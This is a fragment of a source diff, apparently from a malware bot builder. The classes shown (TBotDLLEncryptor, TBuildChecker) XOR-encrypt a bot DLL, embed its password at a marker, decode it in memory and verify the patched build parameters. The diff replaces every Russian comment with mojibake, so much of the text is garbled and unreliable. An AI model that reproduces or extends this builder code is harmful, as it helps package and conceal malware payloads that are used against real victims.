 	FHash = STRA::Hash(Ptr, FDllSize, false);
-	// Шифруем данные
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	PCHAR P = FPassword.t_str();
 	XORCrypt::Crypt(P, (LPBYTE)Ptr, FDllSize);
 
-	// Записываем пароль на место маркера
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	m_memcpy(Marker, FPassword.t_str(), FPassword.Length() + 1);
 
 	return true;
 }
 
 //--------------------------------------------------
-//  Проверяем корректность шифрования длл
+//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ
 //--------------------------------------------------
 bool TBotDLLEncryptor::CheckParam(LPBYTE Buf, LPBYTE OriginalBuf)
 {
 	if (FPosition < 0 || FDllSize == 0)
 		return false;
 
-	// Расшифровываем библиотеку
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	DWORD Size = 0;
 	LPVOID DllBuf = NULL;
 	bool BufAllocated = false;
 	if (!TMemoryDLL::DecodeDll(Buf + Position, Size, DllBuf, BufAllocated))
 		return false;
 
-	// Сравниваем размеры
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	bool Result = FDllSize == Size;
 
-	// Сравниваем содержимое
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	if (Result)
 	{
 		DWORD NewHash = STRA::Hash((PCHAR)DllBuf, FDllSize, false);
@@ -2134,7 +2145,7 @@ bool TBotDLLEncryptor::CheckParam(LPBYTE Buf, LPBYTE OriginalBuf)
 
 
 //*************************************************************
-//   TBuildChecker  - Класс проверки результата сборки
+//   TBuildChecker  - пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 //*************************************************************
 __fastcall  TBuildChecker::TBuildChecker(TComponent* AOwner, TBaseBotModule* AModule)
 	: TComponent(AOwner)
@@ -2153,7 +2164,7 @@ __fastcall  TBuildChecker::~TBuildChecker()
 
 
 //--------------------------------------------------
-//  Функция открывает файлы для сравнения
+//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 //--------------------------------------------------
 bool TBuildChecker::OpenFiles(const UnicodeString& SourceFile, const UnicodeString& ResultFile)
 {
@@ -2167,7 +2178,7 @@ bool TBuildChecker::OpenFiles(const UnicodeString& SourceFile, const UnicodeStri
 }
 
 //--------------------------------------------------
-//  Функция сравнивает два буфера
+//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 //--------------------------------------------------
 bool TBuildChecker::CompareBuffers(LPBYTE Source, DWORD SourceSize, LPBYTE Result, DWORD ResultSize)
 {
@@ -2186,15 +2197,15 @@ bool TBuildChecker::CompareBuffers(LPBYTE Source, DWORD SourceSize, LPBYTE Resul
 			continue;
 		}
 
-		// Нашли отличие в буферах
+		// пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		TBotParam* Param = FModule->GetParamForPos(Pos);
 		if (!Param)
 		{
-			// Наёден байт который не относится к найденной позиции
+			// пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 			return false;
 		}
 
-		// Проверяем валидность параметра
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		if (!Param->CheckParam(Result, Source))
 		{
 //			UnicodeString FileName = "c:\\Test\\Params\\";
@@ -2204,14 +2215,14 @@ bool TBuildChecker::CompareBuffers(LPBYTE Source, DWORD SourceSize, LPBYTE Resul
 		}
 
 
-		// Переходим к концу параметра
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		Pos +=  Param->Size;
 	}
     return true;
 }
 
 //--------------------------------------------------
-//  Функция проверяет сборку
+//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 //--------------------------------------------------
 bool TBuildChecker::Check()
 {
